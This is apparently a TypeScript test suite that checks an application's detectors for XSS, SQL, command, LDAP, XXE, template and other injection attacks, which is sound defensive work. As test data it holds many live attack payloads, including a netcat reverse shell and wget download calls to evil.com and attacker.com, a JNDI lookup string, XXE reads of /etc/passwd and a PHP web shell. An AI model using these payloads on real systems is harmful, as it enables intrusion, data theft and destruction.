/**
 * XSS and Injection Prevention Security Tests
 *
 * This test suite validates that the application properly prevents
 * Cross-Site Scripting (XSS) and various injection attacks.
 */

import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import { render, screen, fireEvent } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import { BrowserRouter } from 'react-router-dom';
import React from 'react';

// Import security utilities
import apiSecurityValidator from '@/lib/api-security-validator';
import securityAuditor from '@/lib/security-audit';
import securityMonitoring from '@/lib/security-monitoring';

// Import DOMPurify for XSS protection
import DOMPurify from 'dompurify';

// Mock DOM environment for XSS testing
const mockDOM = {
  createElement: vi.fn(() => ({
    innerHTML: '',
    textContent: '',
    setAttribute: vi.fn(),
    getAttribute: vi.fn(),
  })),
  createTextNode: vi.fn(() => ({})),
};

describe('XSS and Injection Prevention Tests', () => {
  beforeEach(() => {
    vi.stubEnv('NODE_ENV', 'test');

    // Mock DOM methods
    global.document = mockDOM as any;
    global.window = {} as any;

    // Reset security monitoring
    securityMonitoring['metrics'] = securityMonitoring['initializeMetrics']();
    securityMonitoring['alerts'] = [];
    securityAuditor['events'] = [];

    // Clear all mocks
    vi.clearAllMocks();
  });

  afterEach(() => {
    vi.unstubAllEnvs();
    vi.clearAllMocks();
  });

  describe('Cross-Site Scripting (XSS) Prevention', () => {
    it('should detect and block reflected XSS attacks', () => {
      const reflectedXSSPayloads = [
        '<script>alert("XSS")</script>',
        '<script>alert(document.cookie)</script>',
        '<script>window.location="http://evil.com"</script>',
        '<img src="x" onerror="alert(1)">',
        '<svg onload="alert(1)">',
        '<iframe src="javascript:alert(1)">',
        '<body onload="alert(1)">',
        '<input onfocus="alert(1)" autofocus>',
        '<select onfocus="alert(1)" autofocus>',
        '<textarea onfocus="alert(1)" autofocus>',
        '<keygen onfocus="alert(1)" autofocus>',
        '<video><source onerror="alert(1)">',
        '<audio src="x" onerror="alert(1)">',
      ];

      reflectedXSSPayloads.forEach(payload => {
        const result = apiSecurityValidator.detectXSS(payload);
        expect(result.detected).toBe(true);
        expect(result.type).toContain('xss');
        expect(result.severity).toBe('high');
      });
    });

    it('should detect and block stored XSS attacks', () => {
      const storedXSSPayloads = [
        '<script src="http://evil.com/evil.js"></script>',
        '<link rel="stylesheet" href="javascript:alert(1)">',
        '<style>@import "javascript:alert(1)";</style>',
        '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
        '<object data="javascript:alert(1)">',
        '<embed src="javascript:alert(1)">',
        '<applet code="javascript:alert(1)">',
        '<form><button formaction="javascript:alert(1)">Click</button></form>',
        '<details open ontoggle="alert(1)">',
        '<marquee onstart="alert(1)">',
        '<isindex action="javascript:alert(1)" type="submit">',
      ];

      storedXSSPayloads.forEach(payload => {
        const result = apiSecurityValidator.detectXSS(payload);
        expect(result.detected).toBe(true);
        expect(result.payload).toBe(payload);
      });
    });

    it('should detect and block DOM-based XSS attacks', () => {
      const domXSSPayloads = [
        '#<img src=x onerror=alert(1)>',
        '#<script>alert(1)</script>',
        'javascript:alert(1)',
        '<script>alert(document.domain)</script>',
        '<script>alert(window.location)</script>',
        '${alert(1)}', // Template literal injection
        '{{alert(1)}}', // Angular template injection
        '<%=alert(1)%>', // ERB template injection
        '#{alert(1)}', // Ruby template injection
        '<%=7*7%>', // Expression injection
      ];

      domXSSPayloads.forEach(payload => {
        const result = apiSecurityValidator.detectDOMXSS(payload);
        expect(result.detected).toBe(true);
        expect(result.vectors.length).toBeGreaterThan(0);
      });
    });

    it('should sanitize HTML content safely', () => {
      const sanitizationTests = [
        {
          input: '<script>alert("XSS")</script><p>Safe content</p>',
          expected: '<p>Safe content</p>',
          description: 'Script tags removed',
        },
        {
          input: '<img src="x" onerror="alert(1)">',
          expected: '<img src="x">',
          description: 'Event handlers removed',
        },
        {
          input: '<a href="javascript:alert(1)">Click</a>',
          expected: '<a>Click</a>',
          description: 'JavaScript URLs removed',
        },
        {
          input: '<div style="background:url(javascript:alert(1))">Test</div>',
          expected: '<div>Test</div>',
          description: 'JavaScript in CSS removed',
        },
        {
          input: '<iframe src="http://evil.com"></iframe>',
          expected: '',
          description: 'Iframes removed',
        },
      ];

      sanitizationTests.forEach(test => {
        const sanitized = DOMPurify.sanitize(test.input);
        expect(sanitized).toBe(test.expected);
      });
    });

    it('should detect XSS in various contexts', () => {
      const contextTests = [
        {
          context: 'html_content',
          payload: '<script>alert(1)</script>',
          expected: true,
        },
        {
          context: 'attribute_value',
          payload: '" onmouseover="alert(1)',
          expected: true,
        },
        {
          context: 'javascript_url',
          payload: 'javascript:alert(1)',
          expected: true,
        },
        {
          context: 'css_value',
          payload: 'expression(alert(1))',
          expected: true,
        },
        {
          context: 'url_parameter',
          payload: 'http://evil.com/<script>alert(1)</script>',
          expected: true,
        },
      ];

      contextTests.forEach(test => {
        const result = apiSecurityValidator.detectXSSInContext(test.payload, test.context);
        expect(result.detected).toBe(test.expected);
      });
    });

    it('should prevent XSS bypass attempts', () => {
      const bypassAttempts = [
        '<scr<script>ipt>alert(1)</scr<script>ipt>',
        '<script>alert(String.fromCharCode(88,83,83))</script>',
        '<script>alert(/XSS/)</script>',
        '<script>alert("XSS".toUpperCase())</script>',
        '<script>eval("al"+"ert(1)")</script>',
        '<script>setTimeout("alert(1)",0)</script>',
        '<script>Function("alert(1)")()</script>',
        '<script>(function(){alert(1)})()</script>',
        '<script>[].map.call("alert",eval)()</script>',
        '<script>alert`1`</script>',
        '<script>alert\u00001</script>',
        '<script>alert\u00001</script>',
      ];

      bypassAttempts.forEach(attempt => {
        const result = apiSecurityValidator.detectXSS(attempt);
        expect(result.detected).toBe(true);
        expect(result.bypassAttempt).toBe(true);
      });
    });
  });

  describe('SQL Injection Prevention', () => {
    it('should detect and block SQL injection attacks', () => {
      const sqlInjectionPayloads = [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "1; DELETE FROM users WHERE 1=1; --",
        "' UNION SELECT username, password FROM users --",
        "'; EXEC xp_cmdshell('dir'); --",
        "' OR 1=1 #",
        "' UNION SELECT @@version --",
        "'; ALTER TABLE users ADD COLUMN test VARCHAR(255); --",
        "' UNION SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA --",
        "'; WAITFOR DELAY '00:00:05' --",
        "' AND (SELECT COUNT(*) FROM users) > 0 --",
        "'; SHUTDOWN WITH NOWAIT; --",
        "'; BACKUP DATABASE mydb TO DISK='c:\\backup.db' --",
      ];

      sqlInjectionPayloads.forEach(payload => {
        const result = apiSecurityValidator.detectSQLInjection(payload);
        expect(result.detected).toBe(true);
        expect(result.patterns.length).toBeGreaterThan(0);
        expect(result.severity).toBe('critical');
      });
    });

    it('should detect SQL injection in different query contexts', () => {
      const contextTests = [
        {
          context: 'SELECT',
          payload: "' OR 1=1 --",
          expected: true,
        },
        {
          context: 'INSERT',
          payload: "'); DROP TABLE users; --",
          expected: true,
        },
        {
          context: 'UPDATE',
          payload: "'; UPDATE users SET password='hacked' WHERE 1=1; --",
          expected: true,
        },
        {
          context: 'DELETE',
          payload: "'; DELETE FROM users WHERE 1=1; --",
          expected: true,
        },
        {
          context: 'ORDER BY',
          payload: "1,(SELECT CASE WHEN (1=1) THEN id ELSE NULL END)",
          expected: true,
        },
      ];

      contextTests.forEach(test => {
        const result = apiSecurityValidator.detectSQLInjectionInContext(test.payload, test.context);
        expect(result.detected).toBe(test.expected);
      });
    });

    it('should detect advanced SQL injection techniques', () => {
      const advancedPayloads = [
        "' UNION SELECT NULL,table_name FROM information_schema.tables --",
        "' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a' --",
        "'; IF (SELECT COUNT(*) FROM users)>0 WAITFOR DELAY '00:00:05' --",
        "' AND 1=(SELECT COUNT(*) FROM tabname); --",
        "'; EXECUTE IMMEDIATE 'DROP TABLE users' --",
        "' AND ASCII(SUBSTRING(password,1,1))>64 --",
        "'; DECLARE @cmd VARCHAR(255); SET @cmd='dir'; EXEC master..xp_cmdshell @cmd --",
        "' OR 1=1 UNION SELECT NULL,VERSION(),NULL --",
      ];

      advancedPayloads.forEach(payload => {
        const result = apiSecurityValidator.detectAdvancedSQLInjection(payload);
        expect(result.detected).toBe(true);
        expect(result.technique).toBeDefined();
      });
    });

    it('should detect NoSQL injection attacks', () => {
      const nosqlPayloads = [
        { "$ne": "" },
        { "$gt": "" },
        { "$where": "this.username == 'admin'" },
        { "$regex": ".*" },
        { "$expr": { "$eq": ["$password", "admin"] } },
        { "$or": [{ "username": "admin" }, { "password": { "$ne": "" } }] },
        { "$in": ["admin", "user", "$where"] },
        { "$nin": ["", "$where"] },
        { "$exists": true },
        { "$all": [{ "$regex": "admin" }, { "$ne": "" }] },
      ];

      nosqlPayloads.forEach(payload => {
        const result = apiSecurityValidator.detectNoSQLInjection(payload);
        expect(result.detected).toBe(true);
        expect(result.database).toBe('nosql');
      });
    });
  });

  describe('Command Injection Prevention', () => {
    it('should detect and block command injection attacks', () => {
      const commandInjectionPayloads = [
        '; ls -la',
        '| cat /etc/passwd',
        '& echo 'hacked'',
        '`whoami`',
        '$(id)',
        '; rm -rf /*',
        '| nc attacker.com 4444 -e /bin/sh',
        '; wget http://evil.com/backdoor.sh',
        '| curl http://evil.com/evil.php',
        '& ping -c 10 127.0.0.1',
      ];

      commandInjectionPayloads.forEach(payload => {
        const result = apiSecurityValidator.detectCommandInjection(payload);
        expect(result.detected).toBe(true);
        expect(result.severity).toBe('critical');
      });
    });

    it('should detect command injection in various shells', () => {
      const shellPayloads = [
        { shell: 'bash', payload: '; ls -la' },
        { shell: 'sh', payload: '| cat /etc/passwd' },
        { shell: 'cmd', payload: '& dir' },
        { shell: 'powershell', payload: '; Get-Process' },
        { shell: 'zsh', payload: '`whoami`' },
        { shell: 'fish', payload: '$(id)' },
      ];

      shellPayloads.forEach(test => {
        const result = apiSecurityValidator.detectCommandInjection(test.payload, test.shell);
        expect(result.detected).toBe(true);
        expect(result.shell).toBe(test.shell);
      });
    });

    it('should prevent argument injection', () => {
      const argumentInjectionPayloads = [
        'file.txt; rm -rf /',
        'user; cat /etc/passwd',
        'data | nc attacker.com 4444',
        'input && evil_command',
        'file.txt || malicious_command',
        'config; wget evil.com/shell.sh',
        'path`whoami`',
        'data$(evil_command)',
      ];

      argumentInjectionPayloads.forEach(payload => {
        const result = apiSecurityValidator.detectArgumentInjection(payload);
        expect(result.detected).toBe(true);
      });
    });
  });

  describe('LDAP Injection Prevention', () => {
    it('should detect LDAP injection attacks', () => {
      const ldapInjectionPayloads = [
        "*)(uid=*",
        "*)(|(objectClass=*)",
        "*)(|(password=*",
        "*))%00",
        "admin)(&",
        "*)(&(objectClass=*)",
        "*)(|(objectClass=user)(cn=*)",
        "*)(|(cn=*)(objectClass=*))",
        "*)(|(objectClass=*))",
        "*))(|(cn=*))",
      ];

      ldapInjectionPayloads.forEach(payload => {
        const result = apiSecurityValidator.detectLDAPInjection(payload);
        expect(result.detected).toBe(true);
        expect(result.technique).toContain('ldap');
      });
    });

    it('should detect LDAP injection in filter contexts', () => {
      const filterTests = [
        {
          filter: '(uid={username})',
          payload: 'admin)(|(password=*',
          expected: true,
        },
        {
          filter: '(cn={name})',
          payload: '*)(objectClass=*',
          expected: true,
        },
        {
          filter: '(&(objectClass=user)(uid={uid}))',
          payload: 'admin)(&(objectClass=*))',
          expected: true,
        },
      ];

      filterTests.forEach(test => {
        const result = apiSecurityValidator.detectLDAPInjectionInFilter(test.payload, test.filter);
        expect(result.detected).toBe(test.expected);
      });
    });
  });

  describe('XML Injection Prevention', () => {
    it('should detect XML injection attacks', () => {
      const xmlInjectionPayloads = [
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data>&xxe;</data>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "http://evil.com/evil.xml">]><root>&test;</root>',
        '<![CDATA[<script>alert(1)</script>]]>',
        '<?xml-stylesheet type="text/xsl" href="javascript:alert(1)"?>',
        '<?xml version="1.0"?><!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/passwd">]><message>&ent;</message>',
      ];

      xmlInjectionPayloads.forEach(payload => {
        const result = apiSecurityValidator.detectXMLInjection(payload);
        expect(result.detected).toBe(true);
        expect(result.type).toContain('xml');
      });
    });

    it('should detect XXE (XML External Entity) attacks', () => {
      const xxePayloads = [
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/evil.xml">]>',
        '<!DOCTYPE foo [<!ENTITY xxe PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://evil.com/evil.dtd">]>',
        '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd">]>',
        '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">]>',
      ];

      xxePayloads.forEach(payload => {
        const result = apiSecurityValidator.detectXXE(payload);
        expect(result.detected).toBe(true);
        expect(result.threat).toBe('xxe');
      });
    });

    it('should prevent XPath injection', () => {
      const xpathPayloads = [
        "' or '1'='1",
        "' or name()='username' or '1'='2",
        "admin' or '1'='1",
        "' | //user[position()=1]",
        "' and count(/*)=1 and '1'='1",
        "' and substring(name(/*),1,1)='a' and '1'='1",
        "'|//*|user[1]|',
      ];

      xpathPayloads.forEach(payload => {
        const result = apiSecurityValidator.detectXPathInjection(payload);
        expect(result.detected).toBe(true);
      });
    });
  });

  describe('Template Injection Prevention', () => {
    it('should detect template injection attacks', () => {
      const templatePayloads = [
        '${7*7}',
        '{{7*7}}',
        '#{7*7}',
        '<%=7*7%>',
        '{{config.items()}}',
        '${config.getClass().forName("java.lang.Runtime").getRuntime().exec("whoami")}',
        '{{self.__init__.__globals__.__built__.__import__("os").system("id")}}',
        '{{\'a\'.__class__.__mro__[2].__subclasses__()}}',
        '${T(java.lang.Runtime).getRuntime().exec("whoami")}',
        '{{request.application.__globals__.__builtins__.__import__("os").system("id")}}',
      ];

      templatePayloads.forEach(payload => {
        const result = apiSecurityValidator.detectTemplateInjection(payload);
        expect(result.detected).toBe(true);
        expect(result.template).toBeDefined();
      });
    });

    it('should detect template injection in different engines', () => {
      const engineTests = [
        { engine: 'jinja2', payload: '{{7*7}}', expected: true },
        { engine: 'twig', payload: '{{7*7}}', expected: true },
        { engine: 'freemarker', payload: '${7*7}', expected: true },
        { engine: 'velocity', payload: '#set($x=7*7)${x}', expected: true },
        { engine: 'erb', payload: '<%=7*7%>', expected: true },
        { engine: 'smarty', payload: '{7*7}', expected: true },
        { engine: 'dust', payload: '{7*7}', expected: true },
        { engine: 'handlebars', payload: '{{7*7}}', expected: true },
      ];

      engineTests.forEach(test => {
        const result = apiSecurityValidator.detectTemplateInjection(test.payload, test.engine);
        expect(result.detected).toBe(test.expected);
        if (test.expected) {
          expect(result.engine).toBe(test.engine);
        }
      });
    });
  });

  describe('Code Injection Prevention', () => {
    it('should detect code injection attacks', () => {
      const codeInjectionPayloads = [
        '${jndi:ldap://attacker.com/a}',
        '${java:runtime}',
        '${env:ENV_NAME}',
        '__import__("os").system("ls")',
        'eval("alert(1)")',
        'Function("alert(1)")()',
        'setTimeout("alert(1)",0)',
        'setInterval("alert(1)",1000)',
        'new Function("return process")().env',
        'global.process.mainModule.require("child_process").exec("ls")',
      ];

      codeInjectionPayloads.forEach(payload => {
        const result = apiSecurityValidator.detectCodeInjection(payload);
        expect(result.detected).toBe(true);
        expect(result.severity).toBe('critical');
      });
    });

    it('should detect deserialization attacks', () => {
      const deserializationPayloads = [
        'O:1:"A":1:{s:1:"B";s:2:"hi";}', // PHP object injection
        'aced0005737200176a6176612e7574696c2e48617368736574', // Java serialized
        '{"__proto__": {"admin": true}}', // Node.js prototype pollution
        'rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAABc3IAQm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5jb21wYXJhdG9ycy5UcmFuc2Zvcm1pbmdDb21wYXJhdG9y', // Apache Commons
      ];

      deserializationPayloads.forEach(payload => {
        const result = apiSecurityValidator.detectInsecureDeserialization(payload);
        expect(result.detected).toBe(true);
        expect(result.format).toBeDefined();
      });
    });
  });

  describe('HTTP Parameter Pollution Prevention', () => {
    it('should detect HTTP parameter pollution attacks', () => {
      const pollutionTests = [
        { param: 'id', values: ['1', '2', '3'] },
        { param: 'action', values: ['view', 'edit', 'delete'] },
        { param: 'user', values: ['admin', 'guest', 'user'] },
        { param: 'redirect', values: ['/home', 'http://evil.com'] },
      ];

      pollutionTests.forEach(test => {
        const result = apiSecurityValidator.detectParameterPollution(test);
        expect(result.detected).toBe(true);
        expect(result.parameter).toBe(test.param);
      });
    });

    it('should prevent parameter pollution in different contexts', () => {
      const contextTests = [
        {
          context: 'query_string',
          parameters: { id: ['1', '2'], action: ['view', 'delete'] },
          expected: true,
        },
        {
          context: 'form_data',
          parameters: { user: ['admin', 'guest'] },
          expected: true,
        },
        {
          context: 'json_body',
          parameters: { role: ['user', 'admin'] },
          expected: true,
        },
      ];

      contextTests.forEach(test => {
        const result = apiSecurityValidator.detectParameterPollution(test.parameters, test.context);
        expect(result.detected).toBe(test.expected);
      });
    });
  });

  describe('File Upload Injection Prevention', () => {
    it('should detect malicious file uploads', () => {
      const maliciousFiles = [
        { name: 'shell.php', type: 'application/x-php', content: '<?php system($_GET["cmd"]); ?>' },
        { name: 'backdoor.jsp', type: 'application/x-jsp', content: '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>' },
        { name: 'script.js', type: 'application/javascript', content: '<script>alert(document.cookie)</script>' },
        { name: 'exploit.exe', type: 'application/x-executable', content: 'MZ\x90\x00' },
        { name: 'config.htaccess', type: 'text/plain', content: 'Options +ExecCGI\nAddHandler cgi-script .php' },
        { name: 'web.config', type: 'text/xml', content: '<?xml version="1.0"?><configuration><system.webServer><handlers accessPolicy="Read, Write, Execute" /></system.webServer></configuration>' },
      ];

      maliciousFiles.forEach(file => {
        const result = apiSecurityValidator.detectMaliciousFile(file);
        expect(result.malicious).toBe(true);
        expect(result.threats.length).toBeGreaterThan(0);
      });
    });

    it('should detect file-based XSS attacks', () => {
      const xssFiles = [
        { name: 'xss.html', content: '<script>alert(1)</script>' },
        { name: 'xss.svg', content: '<svg onload="alert(1)"></svg>' },
        { name: 'xss.swf', content: 'flash-xss-payload' },
        { name: 'xss.pdf', content: 'pdf-xss-payload' },
      ];

      xssFiles.forEach(file => {
        const result = apiSecurityValidator.detectFileBasedXSS(file);
        expect(result.detected).toBe(true);
        expect(result.xssVector).toBeDefined();
      });
    });
  });

  describe('Content Security Policy (CSP) Testing', () => {
    it('should validate CSP header implementation', () => {
      const cspTests = [
        {
          csp: "default-src 'self'; script-src 'self' 'unsafe-inline';",
          expected: { secure: false, issues: ['unsafe_inline'] },
        },
        {
          csp: "default-src 'self'; script-src 'self';",
          expected: { secure: true, issues: [] },
        },
        {
          csp: "default-src 'self'; script-src 'self' https://trusted.cdn.com;",
          expected: { secure: true, issues: [] },
        },
        {
          csp: "script-src *;",
          expected: { secure: false, issues: ['wildcard'] },
        },
      ];

      cspTests.forEach(test => {
        const result = apiSecurityValidator.validateCSP(test.csp);
        expect(result.secure).toBe(test.expected.secure);
        expect(result.issues).toEqual(expect.arrayContaining(test.expected.issues));
      });
    });

    it('should detect CSP bypass attempts', () => {
      const bypassAttempts = [
        '<meta http-equiv="Content-Security-Policy" content="script-src \'none\'">',
        '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
        '<link rel="prefetch" href="data:text/html,<script>alert(1)</script>">',
        '<object data="data:text/html,<script>alert(1)</script>">',
        '<embed src="data:text/html,<script>alert(1)</script>">',
        '<iframe srcdoc="<script>alert(1)</script>">',
      ];

      bypassAttempts.forEach(attempt => {
        const result = apiSecurityValidator.detectCSPBypass(attempt);
        expect(result.detected).toBe(true);
        expect(result.bypassTechnique).toBeDefined();
      });
    });
  });

  describe('Input Encoding and Escaping', () => {
    it('should properly encode output for different contexts', () => {
      const encodingTests = [
        {
          input: '<script>alert(1)</script>',
          context: 'html',
          expected: '&lt;script&gt;alert(1)&lt;/script&gt;',
        },
        {
          input: "'; DROP TABLE users; --",
          context: 'sql',
          expected: "''; DROP TABLE users; --",
        },
        {
          input: '${jndi:ldap://attacker.com/a}',
          context: 'log',
          expected: '${jndi:ldap://attacker.com/a}',
        },
        {
          input: 'javascript:alert(1)',
          context: 'url',
          expected: 'javascript%3Aalert%281%29',
        },
        {
          input: '" onclick="alert(1)',
          context: 'attribute',
          expected: '&quot; onclick=&quot;alert(1)',
        },
      ];

      encodingTests.forEach(test => {
        const encoded = apiSecurityValidator.encodeForContext(test.input, test.context);
        expect(encoded).toContain(test.expected);
      });
    });

    it('should validate output encoding is comprehensive', () => {
      const comprehensiveTests = [
        {
          input: '<img src=x onerror=alert(1)>',
          contexts: ['html', 'attribute', 'javascript', 'css', 'url'],
          allSafe: false, // Should be unsafe in at least one context
        },
        {
          input: 'Hello World',
          contexts: ['html', 'attribute', 'javascript', 'css', 'url'],
          allSafe: true, // Should be safe in all contexts
        },
      ];

      comprehensiveTests.forEach(test => {
        const results = test.contexts.map(context =>
          apiSecurityValidator.isSafeInContext(test.input, context)
        );

        const allSafe = results.every(r => r.safe);
        expect(allSafe).toBe(test.allSafe);
      });
    });
  });

  describe('Injection Logging and Monitoring', () => {
    it('should log all injection attempts', () => {
      const injectionAttempts = [
        { type: 'xss', payload: '<script>alert(1)</script>' },
        { type: 'sql', payload: "'; DROP TABLE users; --" },
        { type: 'command', payload: '; ls -la' },
        { type: 'ldap', payload: '*)|(objectClass=*)' },
      ];

      injectionAttempts.forEach(attempt => {
        securityAuditor.logSecurityIncident(
          `${attempt.type}_injection`,
          `Injection attempt detected: ${attempt.type}`,
          'high',
          'unknown',
          'unknown',
          { payload: attempt.payload, type: attempt.type }
        );
      });

      const events = securityAuditor.getRecentEvents();
      expect(events.length).toBeGreaterThanOrEqual(4);
      expect(events.every(e => e.eventType === 'security_incident')).toBe(true);
    });

    it('should generate security alerts for repeated injection attempts', () => {
      // Simulate multiple injection attempts from same IP
      for (let i = 0; i < 5; i++) {
        securityMonitoring.recordSecurityViolation('xss_injection');
        securityMonitoring.recordRequest('/api/test', 'POST', '192.168.1.100');
      }

      const alerts = securityMonitoring.getSecurityAlerts();
      expect(alerts.some(alert => alert.type === 'repeated_injection_attempts')).toBe(true);
    });

    it('should provide injection detection metrics', () => {
      const injectionTypes = ['xss', 'sql', 'command', 'ldap', 'xml'];

      injectionTypes.forEach(type => {
        apiSecurityValidator.detectXSS('<script>alert(1)</script>');
        securityMonitoring.recordSecurityViolation(`${type}_injection`);
      });

      const metrics = securityMonitoring.getSecurityMetrics();
      expect(metrics.securityViolations).toBeGreaterThan(0);
    });
  });

  describe('Real-world Attack Scenarios', () => {
    it('should prevent complex multi-vector attacks', () => {
      const complexAttacks = [
        {
          description: 'SQL Injection + XSS',
          payload: "'; UPDATE users SET profile='<script>alert(1)</script>' WHERE id=1; --",
          expectedDetections: ['sql_injection', 'xss'],
        },
        {
          description: 'Template Injection + Command Injection',
          payload: '${T(java.lang.Runtime).getRuntime().exec("ls -la")}',
          expectedDetections: ['template_injection', 'command_injection'],
        },
        {
          description: 'XSS via File Upload',
          payload: { filename: 'xss.svg', content: '<svg onload="alert(1)"></svg>' },
          expectedDetections: ['xss', 'malicious_file'],
        },
      ];

      complexAttacks.forEach(attack => {
        const detections = [];

        // Test each detection method
        const sqlResult = apiSecurityValidator.detectSQLInjection(attack.payload.toString());
        if (sqlResult.detected) detections.push('sql_injection');

        const xssResult = apiSecurityValidator.detectXSS(attack.payload.toString());
        if (xssResult.detected) detections.push('xss');

        const templateResult = apiSecurityValidator.detectTemplateInjection(attack.payload.toString());
        if (templateResult.detected) detections.push('template_injection');

        const commandResult = apiSecurityValidator.detectCommandInjection(attack.payload.toString());
        if (commandResult.detected) detections.push('command_injection');

        // Verify expected detections
        attack.expectedDetections.forEach(expected => {
          expect(detections).toContain(expected);
        });

        expect(detections.length).toBeGreaterThan(0);
      });
    });

    it('should prevent encoding-based bypass attempts', () => {
      const encodingBypasses = [
        '<script>alert(1)</script>', // Plain
        '%3Cscript%3Ealert%281%29%3C%2Fscript%3E', // URL encoded
        '&lt;script&gt;alert(1)&lt;/script&gt;', // HTML encoded
        '\x3Cscript\x3Ealert(1)\x3C/script\x3E', // Hex encoded
        '&#60;script&#62;alert(1)&#60;/script&#62;', // Decimal encoded
        '&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;', // Hex entity encoded
      ];

      encodingBypasses.forEach(bypass => {
        const result = apiSecurityValidator.detectXSS(bypass);
        expect(result.detected).toBe(true);
        expect(result.bypassTechnique).toContain('encoding');
      });
    });
  });
});